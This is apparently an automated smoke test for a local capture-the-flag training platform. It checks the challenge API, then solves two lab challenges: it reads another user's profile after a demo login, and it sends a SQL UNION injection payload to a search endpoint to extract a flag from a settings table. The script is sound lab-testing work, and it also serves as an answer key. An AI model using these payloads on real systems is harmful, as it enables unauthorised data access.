from __future__ import annotations

import re
import sys

import httpx


BASE = "http://localhost:18081"


def main() -> int:
    items = httpx.get(f"{BASE}/api/v1/challenges", timeout=20).json()["data"]["items"]
    by_id = {item["id"]: item for item in items}
    assert len(items) == 21
    assert by_id["core-a01"]["legacy"] is False
    assert "guide" not in by_id["core-a01"]
    assert httpx.get(f"{BASE}/api/v1/challenges/core-a01/hints", timeout=10).json()["data"]["available_levels"] == [1, 2, 3]

    for challenge_id in ("core-a01", "core-b01"):
        created = httpx.post(f"{BASE}/api/v1/instances", json={"challenge_id": challenge_id}, timeout=180).json()["data"]
        instance_id = created["instance_id"]
        client = httpx.Client(base_url=created["target_url"], timeout=20, follow_redirects=True)
        try:
            if challenge_id == "core-a01":
                assert client.get("/").status_code == 200
                client.post("/login", data={"username": "demo", "password": "demo-pass"})
                assert "customer-north" in client.get("/workspace").text
                note = client.get("/profiles/customer-north").json()["note"]
                flag = re.search(r"flag\{[^}]+\}", note).group(0)
            else:
                assert client.get("/").status_code == 200
                baseline = client.get("/search", params={"q": "terminal", "format": "json"})
                assert baseline.status_code == 200
                payload = "%' UNION SELECT 0, key, 'config', value FROM settings -- "
                rows = client.get("/search", params={"q": payload, "format": "json"}).json()["items"]
                flag = next(row["status"] for row in rows if row["status"].startswith("flag{"))
            result = httpx.post(f"{BASE}/api/v1/instances/{instance_id}/submit", json={"flag": flag}, timeout=20).json()["data"]
            assert result["correct"]
            print(f"{challenge_id}: PASS")
        finally:
            httpx.delete(f"{BASE}/api/v1/instances/{instance_id}", timeout=120)
    print("public_metadata_filter: PASS")
    print("hint_levels: PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
